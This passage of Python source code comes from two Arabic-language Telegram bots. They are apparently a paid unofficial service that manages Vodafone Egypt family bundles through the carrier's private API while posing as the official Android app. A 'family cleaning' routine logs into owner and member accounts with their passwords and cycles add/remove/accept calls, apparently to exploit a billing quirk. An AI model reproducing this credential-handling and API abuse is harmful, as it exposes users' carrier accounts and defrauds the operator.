    
    elif data.startswith("admin_delete_section_"):
        sec_id = int(data.split("_")[3])
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"{EMOJI['success']} نعم", callback_data=f"admin_confirm_delete_section_{sec_id}"),
            types.InlineKeyboardButton(f"{EMOJI['cancel']} لا", callback_data="admin_sections")
        )
        admin_bot.edit_message_text(f"{EMOJI['warning']} *تأكيد حذف القسم*\n\nهل أنت متأكد من حذف هذا القسم؟", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data.startswith("admin_confirm_delete_section_"):
        sec_id = int(data.split("_")[4])
        db.delete_item(sec_id)
        admin_bot.answer_callback_query(call.id, "✅ تم حذف القسم بنجاح")
        show_sections(call)
    
    elif data.startswith("admin_delete_main_"):
        btn_id = int(data.split("_")[3])
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"{EMOJI['success']} نعم", callback_data=f"admin_confirm_delete_main_{btn_id}"),
            types.InlineKeyboardButton(f"{EMOJI['cancel']} لا", callback_data=f"admin_main_button_{btn_id}")
        )
        admin_bot.edit_message_text(f"{EMOJI['warning']} *تأكيد حذف الزر*\n\nهل أنت متأكد من حذف هذا الزر؟", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data.startswith("admin_confirm_delete_main_"):
        btn_id = int(data.split("_")[4])
        button = db.get_item_by_id(btn_id)
        parent_id = button[1] if button else None
        db.delete_item(btn_id)
        admin_bot.answer_callback_query(call.id, "✅ تم حذف الزر بنجاح")
        if parent_id:
            show_main_buttons_in(call, parent_id)
    
    elif data.startswith("admin_delete_sub_"):
        sub_id = int(data.split("_")[3])
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"{EMOJI['success']} نعم", callback_data=f"admin_confirm_delete_sub_{sub_id}"),
            types.InlineKeyboardButton(f"{EMOJI['cancel']} لا", callback_data=f"admin_sub_button_{sub_id}")
        )
        admin_bot.edit_message_text(f"{EMOJI['warning']} *تأكيد حذف الزر الفرعي*\n\nهل أنت متأكد من حذف هذا الزر الفرعي؟", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)
    
    elif data.startswith("admin_confirm_delete_sub_"):
        sub_id = int(data.split("_")[4])
        sub = db.get_item_by_id(sub_id)
        parent_id = sub[1] if sub else None
        db.delete_item(sub_id)
        admin_bot.answer_callback_query(call.id, "✅ تم حذف الزر الفرعي بنجاح")
        if parent_id:
            show_sub_buttons_in(call, parent_id)
    
    elif data.startswith("admin_edit_sub_content_"):
        sub_id = int(data.split("_")[4])
        bot_status['admin_action'] = f'edit_sub_content_{sub_id}'
        admin_bot.edit_message_text(f"{EMOJI['edit']} *تعديل المحتوى*\n\nأرسل المحتوى الجديد للزر الفرعي:\n(لإلغاء الأمر أرسل /cancel)", call.message.chat.id, call.message.message_id, parse_mode='Markdown')

def admin_back_button():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_back"))
    return markup

def show_admin_settings(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"{'🟢' if bot_status['is_running'] else '🔴'} تشغيل/إيقاف البوت", callback_data="admin_toggle_bot"),
        types.InlineKeyboardButton(f"{'🟢' if bot_status['maintenance_mode'] else '🔴'} وضع الصيانة", callback_data="admin_toggle_maintenance"),
        types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_back")
    )
    admin_bot.edit_message_text(f"{EMOJI['settings']} *إعدادات البوت*", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_sections(call):
    sections = db.get_all_level1()
    markup = types.InlineKeyboardMarkup(row_width=1)
    for sec_id, display, emoji, active, visible, pos in sections:
        status = f"{'🟢' if active else '🔴'}{'👁️' if visible else '👁️‍🗨️'}"
        markup.add(types.InlineKeyboardButton(text=f"{display} {status}", callback_data=f"admin_section_{sec_id}"))
    markup.row(types.InlineKeyboardButton(f"{EMOJI['add']} إضافة قسم", callback_data="admin_add_section"), types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_back"))
    admin_bot.edit_message_text(f"{EMOJI['edit']} *الأقسام الرئيسية*", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_section(call, sec_id):
    section = db.get_item_by_id(sec_id)
    if section:
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"{'🟢' if section[7] else '🔴'} تفعيل/تعطيل", callback_data=f"admin_toggle_section_active_{sec_id}"),
            types.InlineKeyboardButton(f"{'👁️' if section[8] else '👁️‍🗨️'} إظهار/إخفاء", callback_data=f"admin_toggle_section_visible_{sec_id}"),
            types.InlineKeyboardButton(f"{EMOJI['delete']} حذف", callback_data=f"admin_delete_section_{sec_id}"),
            types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_sections")
        )
        admin_bot.edit_message_text(f"{section[3]}\nالتحكم في القسم:", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_main_buttons_in(call, sec_id):
    buttons = db.get_all_level2(sec_id)
    section = db.get_item_by_id(sec_id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    for btn_id, display, emoji, active, visible, pos in buttons:
        status = f"{'🟢' if active else '🔴'}{'👁️' if visible else '👁️‍🗨️'}"
        markup.add(types.InlineKeyboardButton(text=f"{display} {status}", callback_data=f"admin_main_button_{btn_id}"))
    markup.row(types.InlineKeyboardButton(f"{EMOJI['add']} إضافة زر", callback_data=f"admin_add_main_{sec_id}"), types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_main_buttons"))
    admin_bot.edit_message_text(f"{section[3]} - الأزرار الرئيسية", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_main_button(call, btn_id):
    button = db.get_item_by_id(btn_id)
    if button:
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"{'🟢' if button[7] else '🔴'} تفعيل/تعطيل", callback_data=f"admin_toggle_main_active_{btn_id}"),
            types.InlineKeyboardButton(f"{'👁️' if button[8] else '👁️‍🗨️'} إظهار/إخفاء", callback_data=f"admin_toggle_main_visible_{btn_id}"),
            types.InlineKeyboardButton(f"{EMOJI['delete']} حذف", callback_data=f"admin_delete_main_{btn_id}"),
            types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data=f"admin_main_buttons_in_{button[1]}")
        )
        admin_bot.edit_message_text(f"{button[3]}\nالتحكم في الزر الرئيسي:", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_sub_buttons_in(call, main_id):
    subs = db.get_all_level3(main_id)
    main_btn = db.get_item_by_id(main_id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    for sub_id, display, emoji, active, visible, pos in subs:
        status = f"{'🟢' if active else '🔴'}{'👁️' if visible else '👁️‍🗨️'}"
        markup.add(types.InlineKeyboardButton(text=f"{display} {status}", callback_data=f"admin_sub_button_{sub_id}"))
    markup.row(types.InlineKeyboardButton(f"{EMOJI['add']} إضافة زر فرعي", callback_data=f"admin_add_sub_{main_id}"), types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data="admin_sub_buttons"))
    admin_bot.edit_message_text(f"{main_btn[3]} - الأزرار الفرعية", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_sub_button(call, sub_id):
    sub = db.get_item_by_id(sub_id)
    if sub:
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"{'🟢' if sub[7] else '🔴'} تفعيل/تعطيل", callback_data=f"admin_toggle_sub_active_{sub_id}"),
            types.InlineKeyboardButton(f"{'👁️' if sub[8] else '👁️‍🗨️'} إظهار/إخفاء", callback_data=f"admin_toggle_sub_visible_{sub_id}"),
            types.InlineKeyboardButton(f"{EMOJI['edit']} تعديل المحتوى", callback_data=f"admin_edit_sub_content_{sub_id}"),
            types.InlineKeyboardButton(f"{EMOJI['delete']} حذف", callback_data=f"admin_delete_sub_{sub_id}"),
            types.InlineKeyboardButton(f"{EMOJI['back']} رجوع", callback_data=f"admin_sub_buttons_in_{sub[1]}")
        )
        admin_bot.edit_message_text(f"{sub[3]}\nالتحكم في الزر الفرعي:", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

@admin_bot.message_handler(func=lambda message: message.from_user.id in ADMINS)
def admin_handle_text(message):
    global SUBSCRIPTION_PRICE, VODAFONE_CASH_NUMBER
    user_id = message.from_user.id
    text = message.text
    
    if bot_status.get('admin_action') == 'waiting_broadcast':
        if text == '/cancel':
            bot_status['admin_action'] = None
            admin_bot.reply_to(message, f"{EMOJI['cancel']} تم إلغاء البث")
            return
        
        users = db.get_all_users()
        sent = 0
        msg = admin_bot.reply_to(message, f"{EMOJI['info']} جاري البث لـ {len(users)} مستخدم...")
        
        for uid in users:
            try:
                user_bot.send_message(uid, f"{EMOJI['broadcast']} *رسالة من الإدارة*\n\n{text}", parse_mode='Markdown')
                sent += 1
                time.sleep(0.05)
            except:
                pass
        
        admin_bot.edit_message_text(f"{EMOJI['success']} تم البث بنجاح\n\n✅ تم الإرسال لـ {sent} مستخدم\n❌ فشل الإرسال لـ {len(users) - sent} مستخدم", msg.chat.id, msg.message_id, parse_mode='Markdown')
        bot_status['admin_action'] = None
    
    elif bot_status.get('admin_action', '').startswith('edit_sub_content_'):
        sub_id = int(bot_status['admin_action'].split('_')[3])
        if text == '/cancel':
            bot_status['admin_action'] = None
            admin_bot.reply_to(message, f"{EMOJI['cancel']} تم إلغاء التعديل")
            return
        if db.update_item_content(sub_id, text):
            admin_bot.reply_to(message, f"{EMOJI['success']} تم تحديث المحتوى بنجاح")
        else:
            admin_bot.reply_to(message, f"{EMOJI['error']} حدث خطأ أثناء تحديث المحتوى")
        bot_status['admin_action'] = None

    elif bot_status.get('admin_action') == 'waiting_block_user_id':
        if text == '/cancel':
            bot_status['admin_action'] = None
            admin_bot.reply_to(message, f"{EMOJI['cancel']} تم الإلغاء")
            return
        try:
            target_id = int(text.strip())
            db.add_user(target_id, "", "")
            db.block_user(target_id)
            admin_bot.reply_to(message, f"🚫 *تم حظر المستخدم*\n🆔 ID: `{target_id}`", parse_mode='Markdown')
            try:
                user_bot.send_message(target_id, "🚫 *تم حظرك من استخدام البوت من قِبل الإدارة.*", parse_mode='Markdown')
            except:
                pass
        except ValueError:
            admin_bot.reply_to(message, "❌ ID غير صحيح، أرسل رقم فقط")
        bot_status['admin_action'] = None

    elif bot_status.get('admin_action') == 'waiting_unblock_user_id':
        if text == '/cancel':
            bot_status['admin_action'] = None
            admin_bot.reply_to(message, f"{EMOJI['cancel']} تم الإلغاء")
            return
        try:
            target_id = int(text.strip())
            db.unblock_user(target_id)
            admin_bot.reply_to(message, f"✅ *تم إلغاء حظر المستخدم*\n🆔 ID: `{target_id}`", parse_mode='Markdown')
            try:
                user_bot.send_message(target_id, "✅ *تم رفع الحظر عنك، يمكنك استخدام البوت الآن.*", parse_mode='Markdown')
            except:
                pass
        except ValueError:
            admin_bot.reply_to(message, "❌ ID غير صحيح، أرسل رقم فقط")
        bot_status['admin_action'] = None

    elif bot_status.get('admin_action') == 'waiting_add_sub_user_id':
        if text == '/cancel':
            bot_status['admin_action'] = None
            admin_bot.reply_to(message, f"{EMOJI['cancel']} تم الإلغاء")
            return
        try:
            target_id = int(text.strip())
            end_date = db.add_subscription(target_id, "", "مستخدم", months=1)
            admin_bot.reply_to(message, f"✅ *تم إضافة اشتراك*\n🆔 ID: `{target_id}`\n📅 ينتهي في: *{end_date.strftime('%Y-%m-%d')}*", parse_mode='Markdown')
            try:
                user_bot.send_message(target_id, f"✅ *تم تفعيل اشتراكك في البوت!*\n📅 صالح حتى: *{end_date.strftime('%Y-%m-%d')}*\n\nأرسل /start للبدء 🚀", parse_mode='Markdown')
            except:
                pass
        except ValueError:
            admin_bot.reply_to(message, "❌ ID غير صحيح، أرسل رقم فقط")
        bot_status['admin_action'] = None

    elif bot_status.get('admin_action') == 'waiting_remove_sub_user_id':
        if text == '/cancel':
            bot_status['admin_action'] = None
            admin_bot.reply_to(message, f"{EMOJI['cancel']} تم الإلغاء")
            return
        try:
            target_id = int(text.strip())
            db.remove_subscription(target_id)
            admin_bot.reply_to(message, f"✅ *تم حذف اشتراك المستخدم*\n🆔 ID: `{target_id}`", parse_mode='Markdown')
            try:
                user_bot.send_message(target_id, "⚠️ *تم إلغاء اشتراكك في البوت من قِبل الإدارة.*", parse_mode='Markdown')
            except:
                pass
        except ValueError:
            admin_bot.reply_to(message, "❌ ID غير صحيح، أرسل رقم فقط")
        bot_status['admin_action'] = None

    elif bot_status.get('admin_action') == 'waiting_new_sub_price':
        if text == '/cancel':
            bot_status['admin_action'] = None
            admin_bot.reply_to(message, f"{EMOJI['cancel']} تم الإلغاء")
            return
        try:
            new_price = int(text.strip())
            if new_price <= 0:
                raise ValueError
            SUBSCRIPTION_PRICE = new_price
            admin_bot.reply_to(message, f"✅ *تم تغيير سعر الاشتراك إلى {SUBSCRIPTION_PRICE} جنيه/شهر*", parse_mode='Markdown')
        except ValueError:
            admin_bot.reply_to(message, "❌ سعر غير صحيح، أرسل رقم موجب فقط")
        bot_status['admin_action'] = None

    elif bot_status.get('admin_action') == 'waiting_new_vodafone_cash':
        if text == '/cancel':
            bot_status['admin_action'] = None
            admin_bot.reply_to(message, f"{EMOJI['cancel']} تم الإلغاء")
            return
        new_number = text.strip()
        if re.match(r'^01[0-9]{9}$', new_number):
            VODAFONE_CASH_NUMBER = new_number
            admin_bot.reply_to(message, f"✅ *تم تغيير رقم فودافون كاش إلى* `{VODAFONE_CASH_NUMBER}`", parse_mode='Markdown')
        else:
            admin_bot.reply_to(message, "❌ رقم غير صحيح، أرسل رقم مصري صحيح (11 رقم)")
        bot_status['admin_action'] = None

# ==================== إضافة أوامر بوت المستخدمين ====================
user_bot_commands = [
    types.BotCommand("start", "بدء بوت  "),
    types.BotCommand("login", "تسجيل دخول في انا فودافون"),
    types.BotCommand("menu", "قائمه خدمات بوت  "),
    types.BotCommand("cancel", "الغاء العمليه الحاليه")
]

admin_bot_commands = [
    types.BotCommand("start", "فتح لوحة تحكم المطور")
]

try:
    user_bot.set_my_commands(user_bot_commands)
    print("✅ تم تعيين أوامر بوت المستخدمين بنجاح")
except Exception as e:
    print(f"❌ فشل تعيين أوامر بوت المستخدمين: {e}")

try:
    admin_bot.set_my_commands(admin_bot_commands)
    print("✅ تم تعيين أوامر بوت التحكم بنجاح")
except Exception as e:
    print(f"❌ فشل تعيين أوامر بوت التحكم: {e}")

# ==================== تشغيل البوتين ====================
def run_user_bot():
    while True:
        try:
            user_bot.infinity_polling()
        except Exception as e:
            print(f"User bot error: {e}")
            time.sleep(5)

# =====================================================================
# ======= قسم إدارة العائلة المطور (مدمج ومحول من الملف الثاني) =======
# =====================================================================

# --- 1. الدوال المساعدة وجلب البيانات من السيرفر ---

from typing import Any, Dict, List, Optional
from collections import defaultdict

def get_family_members_dashboard(access_token: str, msisdn: str) -> Dict[str, List[Dict[str, Any]]]:
    """جلب قائمة أعضاء العائلة (النشطين والمعلقين) مع نسبهم"""
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'Authorization': f'Bearer {access_token}',
        'api-version': 'v2',
        'msisdn': msisdn,
        'clientId': 'AnaVodafoneAndroid',
        'Accept-Language': 'ar',
    }
    params = {'type': 'Family'}
    try:
        resp = requests.get('https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup', params=params, headers=headers, timeout=30)
        if resp.status_code == 404:
            return {'active': [], 'pending': []}
        if resp.status_code != 200:
            return {'active': [], 'pending': []}
        
        result = resp.json()
        if not result:
            return {'active': [], 'pending': []}
            
        family = result[0]
        members = family.get('parts', {}).get('member', [])
        active = []
        pending_raw = []
        
        for m in members:
            if m.get('type') == 'Owner':
                continue
            ids = m.get('id', [])
            phone = None
            for id_obj in ids:
                if id_obj.get('schemeName') == 'MSISDN':
                    phone = id_obj.get('value')
                    break
            if not phone:
                continue
                
            # تحويل الرقم لصيغة محلية
            if phone.startswith("20") and len(phone) == 12:
                phone_local = "0" + phone[2:]
            else:
                phone_local = phone
                
            status_code = str(m.get('status'))
            chars = m.get('characteristic', {}).get('characteristicsValue', [])
            flex_value = None
            for ch in chars:
                if ch.get('characteristicName') == 'flex':
                    flex_value = ch.get('value')
                    
            if status_code == "1":
                active.append({'phone': phone_local, 'flex': flex_value})
            elif status_code == "5":
                pending_raw.append({'phone': phone_local, 'flex': flex_value})
                
        pending_dict = defaultdict(list)
        for p in pending_raw:
            pending_dict[p['phone']].append(p['flex'])
            
        pending = []
        for phone, flexes in pending_dict.items():
            pending.append({'phone': phone, 'flex': flexes[0], 'count': len(flexes)})
            
        return {'active': active, 'pending': pending}
    except Exception:
        return {'active': [], 'pending': []}


def get_member_consumption_details(owner_token: str, owner_phone: str, member_phone: str) -> Optional[Dict[str, str]]:
    """جلب استهلاك العضو المحدد من حساب الأونر"""
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'api-host': 'usageConsumptionHost',
        'useCase': 'familyDetailed',
        'Authorization': f'Bearer {owner_token}',
        'msisdn': owner_phone,
        'clientId': 'AnaVodafoneAndroid',
        'Accept-Language': 'ar',
    }
    params = {'@type': 'familyDetailed', 'bucket.product.publicIdentifier': member_phone}
    try:
        resp = requests.get('https://mobile.vodafone.com.eg/services/dxl/usage/usageConsumptionReport', params=params, headers=headers, timeout=15)
        if resp.status_code != 200:
            return None
        data = resp.json()
        for item in data:
            if item.get('name') == 'Flex_Family_Main_Bundle':
                for bucket in item.get('bucket', []):
                    if bucket.get('usageType') == 'FLEX':
                        remaining = None
                        used = None
                        for bal in bucket.get('bucketBalance', []):
                            if bal.get('@type') == 'Remaining':
                                remaining = bal.get('remainingValue', {})
                        for counter in bucket.get('bucketCounter', []):
                            if counter.get('@type') == 'Used' and counter.get('level') == 'Local':
                                used = counter.get('value', {})
                        return {
                            'remaining': f"{remaining.get('amount', 0)} فليكس" if remaining else "غير متاح",
                            'used': f"{used.get('amount', 0)} فليكس" if used else "غير متاح"
                        }
        return None
    except Exception:
        return None


def cancel_invitation_api(token: str, owner_msisdn: str, member_phone: str) -> bool:
    """إلغاء دعوة معلقة لم تقبل بعد"""
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'Authorization': f'Bearer {token}',
        'msisdn': owner_msisdn,
        'clientId': 'AnaVodafoneAndroid',
        'Accept-Language': 'ar',
        'Content-Type': 'application/json; charset=UTF-8',
    }
    json_data = {
        'category': [{'listHierarchyId': 'TemplateID', 'value': '0'}],
        'createdBy': {'value': 'MobileApp'},
        'name': 'FlexFamily',
        'parts': {
            'member': [
                {'id': [{'schemeName': 'MSISDN', 'value': member_phone}], 'type': 'Member'}, 
                {'id': [{'schemeName': 'MSISDN', 'value': owner_msisdn}], 'type': 'Owner'}
            ]
        },
        'type': 'CancelInvitation',
    }
    try:
        resp = requests.patch('https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup', headers=headers, json=json_data, timeout=30)
        return resp.status_code in (200, 201)
    except Exception:
        return False

# --- 2. خدمات التحكم وعرض الواجهات (Handlers) ---

def handle_family_dashboard_service(user_id):
    """عرض لوحة تحكم العائلة التفاعلية الشاملة للأعضاء"""
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*", parse_mode='Markdown')
        return

    loading_msg = user_bot.send_message(user_id, f"{EMOJI['refresh']} *جاري تحديث بيانات العائلة وفحص الأعضاء...*", parse_mode='Markdown')
    
    token = session['token']
    phone = session['phone']
    
    members = get_family_members_dashboard(token, phone)
    active = members.get('active', [])
    pending = members.get('pending', [])
    
    try:
        user_bot.delete_message(user_id, loading_msg.message_id)
    except:
        pass

    if not active and not pending:
        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton("➕ دعوة فرد جديد", callback_data="fam_invite_menu"))
        markup.row(types.InlineKeyboardButton("🔄 تحديث القائمة", callback_data="fam_refresh_dashboard"))
        user_bot.send_message(user_id, f"{EMOJI['family']} *لوحة العائلة:*\n\nعائلتك فارغة حالياً لا يوجد أعضاء نشطين أو دعوات معلقة.", parse_mode='Markdown', reply_markup=markup)
        return

    # عرض الأعضاء النشطين أولاً
    for m in active:
        info = f"{EMOJI['phone']} *العضو النشط:* `{m['phone']}`\n"
        info += f"✅ *الحالة:* مفعّل ونشط بالباقة\n"
        info += f"📊 *النسبة الحالية:* {m['flex']} فليكس"
        
        # أزرار التحكم السريعة للعضو
        markup = types.InlineKeyboardMarkup(row_width=3)
        btn_1300 = types.InlineKeyboardButton("1300ج", callback_data=f"fam_quota_{m['phone']}_10")
        btn_2600 = types.InlineKeyboardButton("2600ج", callback_data=f"fam_quota_{m['phone']}_20")
        btn_5200 = types.InlineKeyboardButton("5200ج", callback_data=f"fam_quota_{m['phone']}_40")
        btn_del = types.InlineKeyboardButton(f"{EMOJI['delete_member']} حذف الفرد", callback_data=f"fam_kick_{m['phone']}")
        btn_sc = types.InlineKeyboardButton(f"🔍 فحص الاستهلاك", callback_data=f"fam_usage_{m['phone']}")
        
        markup.row(btn_1300, btn_2600, btn_5200)
        markup.row(btn_sc, btn_del)
        user_bot.send_message(user_id, info, parse_mode='Markdown', reply_markup=markup)

    # عرض الدعوات المعلقة
    for p in pending:
        info = f"{EMOJI['time']} *عضو معلق (دعوة):* `{p['phone']}`\n"
        info += f"⏳ *الحالة:* بانتظار قَبول العضو\n"
        info += f"📊 *النسبة المقدرة:* {p['flex']} فليكس"
        
        markup = types.InlineKeyboardMarkup()
        btn_cancel = types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء الدعوة المعلقة", callback_data=f"fam_cancel_{p['phone']}")
        btn_kick = types.InlineKeyboardButton(f"{EMOJI['delete_member']} حذف الفرد نهائياً", callback_data=f"fam_kick_{p['phone']}")
        markup.row(btn_cancel, btn_kick)
        user_bot.send_message(user_id, info, parse_mode='Markdown', reply_markup=markup)

    # أزرار الإدارة العامة أسفل اللوحة
    gen_markup = types.InlineKeyboardMarkup()
    if len(active) < 2:
        gen_markup.row(types.InlineKeyboardButton("➕ دعوة فرد جديد", callback_data="fam_invite_menu"))
    gen_markup.row(types.InlineKeyboardButton("🔄 تحديث اللوحة", callback_data="fam_refresh_dashboard"))
    user_bot.send_message(user_id, f"⚙️ *إدارة عامة لـ العائلة:*", reply_markup=gen_markup)


# --- 3. معالجة العمليات التفاعلية (Callbacks) ---

@user_bot.callback_query_handler(func=lambda call: call.data.startswith('fam_'))
def handle_family_dashboard_callbacks(call):
    user_id = call.from_user.id
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.answer_callback_query(call.id, "⚠️ يرجى تسجيل الدخول أولاً")
        return

    token = session['token']
    owner_phone = session['phone']
    data = call.data
    
    # 1. تحديث اللوحة
    if data == "fam_refresh_dashboard":
        user_bot.answer_callback_query(call.id, "🔄 جاري التحديث...")
        try: user_bot.delete_message(call.message.chat.id, call.message.message_id)
        except: pass
        handle_family_dashboard_service(user_id)
        
    # 2. تغيير نسبة فليكسات فرد
    elif data.startswith("fam_quota_"):
        parts = data.split("_")
        target_member = parts[2]
        percentage = int(parts[3])
        user_bot.answer_callback_query(call.id, "⏳ جاري تعديل النسبة...")
        
        # استدعاء دالة تعديل النسبة الأصلية من ملفك
        res = change_quota(owner_phone, "Bearer " + token, target_member, percentage)
        if res.get('success'):
            user_bot.send_message(user_id, f"✅ تم تعديل نسبة العضو `{target_member}` بنجاح.", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"❌ فشل تعديل النسبة: {res.get('message')}")
            
    # 3. حذف فرد من العائلة
    elif data.startswith("fam_kick_"):
        target_member = data.split("_")[2]
        user_bot.answer_callback_query(call.id, "⏳ جاري الحذف...")
        res = remove_member(owner_phone, "Bearer " + token, target_member)
        if res.get('success'):
            user_bot.send_message(user_id, f"✅ تم حذف العضو `{target_member}` من العائلة بنجاح.", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"❌ فشل حذف العضو: {res.get('message')}")

    # 4. إلغاء دعوة معلقة
    elif data.startswith("fam_cancel_"):
        target_member = data.split("_")[2]
        user_bot.answer_callback_query(call.id, "⏳ جاري إلغاء الدعوة...")
        success = cancel_invitation_api(token, owner_phone, target_member)
        if success:
            user_bot.send_message(user_id, f"✅ تم إلغاء الدعوة المرسلة لـ `{target_member}`.", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"❌ فشل إلغاء الدعوة من السيرفر.")

    # 5. فحص استهلاك فليكسات العضو دورتك الحالية
    elif data.startswith("fam_usage_"):
        target_member = data.split("_")[2]
        user_bot.answer_callback_query(call.id, "🔍 جاري جلب تفاصيل الاستهلاك...")
        consumption = get_member_consumption_details(token, owner_phone, target_member)
        if consumption:
            msg = f"📊 *استهلاك الفرد:* `{target_member}`\n"
            msg += f"📉 *المستهلك:* {consumption['used']}\n"
            msg += f"✅ *المتبقي:* {consumption['remaining']}"
            user_bot.send_message(user_id, msg, parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"⚠️ لم نتمكن من جلب تفاصيل الاستهلاك لهذا الرقم حالياً.")

    # 6. فتح قائمة دعوة رقم جديد
    elif data == "fam_invite_menu":
        bot_status['user_data'][user_id] = {'action': 'fam_waiting_invite_phone'}
        user_bot.send_message(user_id, "📞 *أدخل رقم الهاتف المراد دعوته للعائلة:*", parse_mode='Markdown')


# --- 4. معالجة الإدخال النصي لدعوة فرد جديد ---

def handle_text_family_invite_phone(message, user_id):
    target_phone = re.sub(r'[^0-9]', '', message.text.strip())
    if len(target_phone) != 11 or not target_phone.startswith("01"):
        user_bot.send_message(user_id, "❌ الرقم غير صحيح! يرجى إدخال رقم هاتف مصري صحيح مكون من 11 رقم:")
        return
        
    bot_status['user_data'][user_id]['target_phone'] = target_phone
    bot_status['user_data'][user_id]['action'] = 'fam_waiting_invite_quota'
    
    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("1300 فليكس (10%)", callback_data="fam_do_invite_10"),
        types.InlineKeyboardButton("2600 فليكس (20%)", callback_data="fam_do_invite_20")
    )
    markup.row(types.InlineKeyboardButton("5200 فليكس (40%)", callback_data="fam_do_invite_40"))
    user_bot.send_message(user_id, f"📊 اختر كمية الفليكسات (النسبة) المراد منحها للرقم `{target_phone}`:", parse_mode='Markdown', reply_markup=markup)


@user_bot.callback_query_handler(func=lambda call: call.data.startswith('fam_do_invite_'))
def execute_family_invitation_callback(call):
    user_id = call.from_user.id
    quota_val = int(call.data.split("_")[3])
    
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'fam_waiting_invite_quota':
        user_bot.answer_callback_query(call.id, "❌ انتهت صلاحية العملية.")
        return
        
    target_member = user_data.get('target_phone')
    logged_in, session = is_logged_in(user_id)
    
    user_bot.answer_callback_query(call.id, "📨 جاري إرسال الدعوة...")
    try: user_bot.delete_message(call.message.chat.id, call.message.message_id)
    except: pass
    
    res = addMember(session['phone'], target_member, "Bearer " + session['token'], quota_val)
    if res.get('success'):
        user_bot.send_message(user_id, f"✅ *{res.get('message')}* لإدارته افتح لوحة التحكم مجدداً.", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"❌ *فشل إرسال الدعوة:*\n{res.get('message')}", parse_mode='Markdown')
        
    del bot_status['user_data'][user_id]


# =====================================================================
# ======= 5. محرك تنظيف العائلة المؤتمن الذكي الذاتي (Background Thread) =======
# =====================================================================

def run_family_cleaning_thread_worker(user_id, chat_id, message_id, owner_num, owner_pass, member_num, member_pass):
    """خيط منفصل بالخلفية لتنفيذ عملية تنظيف العائلة التدريجية وتحديث شريط التقدم تزامناً"""
    
    def update_bar(percent, bar_length=20):
        filled = int(bar_length * percent // 100)
        bar = "█" * filled + "░" * (bar_length - filled)
        text = f"🧹 *جاري تنظيف وتصفية فلوت العائلة حالياً...*\n\n"
        text += f"[{bar}] *{percent}%*\n\n"
        text += f"💡 _يرجى عدم القيام بأي عمليات أخرى حتى انتهاء العداد._"
        try: user_bot.edit_message_text(text, chat_id, message_id, parse_mode='Markdown')
        except: pass

    try:
        # خطوة 1: جلب توكن الأونر
        update_bar(10)
        auth_owner = get_authorization(owner_num, owner_pass)
        if not auth_owner['success']:
            user_bot.send_message(user_id, "❌ فشل التنظيف: بيانات حساب المالك (الأونر) غير صحيحة.")
            return
        owner_token = auth_owner['token']
        time.sleep(1)
        
        # خطوة 2: دعوة أولى لتأكيد الارتباط
        update_bar(25)
        addMember(owner_num, member_num, "Bearer " + owner_token, 10)
        time.sleep(7)
        
        # خطوة 3: تصفية وحذف فوري
        update_bar(45)
        remove_member(owner_num, "Bearer " + owner_token, member_num)
        time.sleep(7)
        
        # خطوة 4: دعوة ثانية لتثبيت التصفية
        update_bar(65)
        addMember(owner_num, member_num, "Bearer " + owner_token, 10)
        time.sleep(7)
        
        # خطوة 5: تسجيل دخول العضو وقبول الدعوة تلقائياً
        update_bar(80)
        auth_member = get_authorization(member_num, member_pass)
        if auth_member['success']:
            # قبول الدعوة من طرف العضو
            accept_invitation(owner_num, member_num, "Bearer " + auth_member['token'])
            time.sleep(7)
            
